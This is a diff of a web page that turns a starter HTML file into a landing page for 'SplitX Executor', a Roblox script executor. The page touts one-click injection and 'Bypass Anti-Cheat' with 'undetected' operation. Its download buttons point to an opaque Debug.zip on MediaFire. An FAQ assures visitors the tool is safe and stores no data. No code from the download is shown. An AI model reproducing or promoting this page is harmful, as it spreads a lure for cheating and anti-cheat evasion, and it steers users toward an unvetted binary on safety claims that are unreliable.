@@ -1,33 +1,224 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My First Web Page</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 50px;
-            background-color: #f0f0f0;
-        }
-        button {
-            padding: 10px 20px;
-            font-size: 16px;
-            border-radius: 8px;
-            border: none;
-            background-color: #007BFF;
-            color: white;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>SplitX Executor</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: #0e0e0e;
+      color: #fff;
+    }
+
+    header {
+      background: #121212;
+      padding: 20px 40px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid #222;
+    }
+
+    header h1 {
+      color: #0ff;
+      font-size: 28px;
+    }
+
+    nav a {
+      margin-left: 20px;
+      color: #bbb;
+      text-decoration: none;
+      font-weight: bold;
+      transition: color 0.3s ease;
+    }
+
+    nav a:hover {
+      color: #0ff;
+    }
+
+    .hero {
+      padding: 100px 40px;
+      text-align: center;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+    }
+
+    .hero h2 {
+      font-size: 48px;
+      margin-bottom: 20px;
+      color: #0ff;
+    }
+
+    .hero p {
+      font-size: 18px;
+      color: #ddd;
+    }
+
+    .download-btn {
+      margin-top: 30px;
+      padding: 15px 30px;
+      font-size: 18px;
+      background: #0ff;
+      color: #000;
+      border: none;
+      cursor: pointer;
+      border-radius: 8px;
+      transition: background 0.3s ease;
+      text-decoration: none;
+      display: inline-block;
+    }
+
+    .download-btn:hover {
+      background: #00cccc;
+    }
+
+    .features {
+      padding: 60px 40px;
+      background: #181818;
+    }
+
+    .features h3 {
+      text-align: center;
+      font-size: 36px;
+      margin-bottom: 40px;
+      color: #0ff;
+    }
+
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 30px;
+    }
+
+    .feature {
+      background: #222;
+      padding: 20px;
+      border-radius: 10px;
+      border: 1px solid #333;
+      transition: transform 0.3s;
+    }
+
+    .feature:hover {
+      transform: translateY(-5px);
+    }
+
+    .feature h4 {
+      color: #0ff;
+      margin-bottom: 10px;
+    }
+
+    .faq {
+      padding: 60px 40px;
+      background: #101010;
+    }
+
+    .faq h3 {
+      text-align: center;
+      font-size: 32px;
+      color: #0ff;
+      margin-bottom: 30px;
+    }
+
+    .faq-item {
+      margin-bottom: 20px;
+    }
+
+    .faq-item h4 {
+      color: #fff;
+      margin-bottom: 5px;
+    }
+
+    .faq-item p {
+      color: #aaa;
+    }
+
+    footer {
+      text-align: center;
+      padding: 30px;
+      background: #080808;
+      color: #555;
+    }
+
+    @media (max-width: 600px) {
+      .hero h2 {
+        font-size: 36px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <h1>Welcome to My Web Page</h1>
-    <p>This is a simple HTML file with a styled button.</p>
-    <button onclick="alert('Button clicked!')">Click Me</button>
+
+<header>
+  <h1>SplitX</h1>
+  <nav>
+    <a href="#features">Features</a>
+    <a href="#download">Download</a>
+    <a href="#faq">FAQ</a>
+  </nav>
+</header>
+
+<section class="hero">
+  <h2>SplitX Executor</h2>
+  <p>The most advanced, safe, and user-friendly Roblox script executor. Unlock the full power of scripting.</p>
+  <a class="download-btn" href="https://download1334.mediafire.com/lw555tpkrtxgAR29rJHh60qy_HxHYRefTxCpXlqMqpU-FtV28PPAvRIOlrPNkiBxQKVVwMIQU3ER_CtYtz93kwqrsobvmNeAdNQmF7pesEEibC5qulI9OcsWh__8KnVAi8C75rWmypSs21ITuCsxr7ObIHKAEV-Yx-UbUH0Ab4w/bbc7xsod8ybwft2/Debug.zip" target="_blank">Download Now</a>
+</section>
+
+<section class="features" id="features">
+  <h3>Features</h3>
+  <div class="feature-grid">
+    <div class="feature">
+      <h4>Fast Injection</h4>
+      <p>Lightning-fast script execution with one-click injection.</p>
+    </div>
+    <div class="feature">
+      <h4>Script Hub</h4>
+      <p>Access hundreds of pre-loaded and community scripts directly.</p>
+    </div>
+    <div class="feature">
+      <h4>Custom UI</h4>
+      <p>Beautiful and intuitive user interface styled like classic UIs.</p>
+    </div>
+    <div class="feature">
+      <h4>Bypass Anti-Cheat</h4>
+      <p>Works with most games undetected thanks to smart bypass tech.</p>
+    </div>
+    <div class="feature">
+      <h4>Auto-Update</h4>
+      <p>Always up-to-date with the latest Roblox patches.</p>
+    </div>
+    <div class="feature">
+      <h4>100% Free</h4>
+      <p>No paid tiers or locked features—SplitX is fully free.</p>
+    </div>
+  </div>
+</section>
+
+<section class="faq" id="faq">
+  <h3>Frequently Asked Questions</h3>
+  <div class="faq-item">
+    <h4>Is SplitX safe to use?</h4>
+    <p>Yes! We use advanced protections and do not store user data.</p>
+  </div>
+  <div class="faq-item">
+    <h4>How do I run scripts?</h4>
+    <p>Launch Roblox, inject SplitX, and paste your script into the editor. Hit run.</p>
+  </div>
+  <div class="faq-item">
+    <h4>Will I get banned?</h4>
+    <p>We use anti-detection methods, but no executor is 100% risk-free. Use with caution.</p>
+  </div>
+</section>
+
+<section class="hero" id="download" style="padding: 80px 40px;">
+  <h2>Ready to try SplitX?</h2>
+  <p>Download the latest version below and start scripting in seconds.</p>
+  <a class="download-btn" href="https://download1334.mediafire.com/lw555tpkrtxgAR29rJHh60qy_HxHYRefTxCpXlqMqpU-FtV28PPAvRIOlrPNkiBxQKVVwMIQU3ER_CtYtz93kwqrsobvmNeAdNQmF7pesEEibC5qulI9OcsWh__8KnVAi8C75rWmypSs21ITuCsxr7ObIHKAEV-Yx-UbUH0Ab4w/bbc7xsod8ybwft2/Debug.zip" target="_blank">Download SplitX</a>
+</section>
+
+<footer>
+  &copy; 2025 SplitX Executor. Not affiliated with Roblox Corporation.
+</footer>
+
 </body>
 </html>
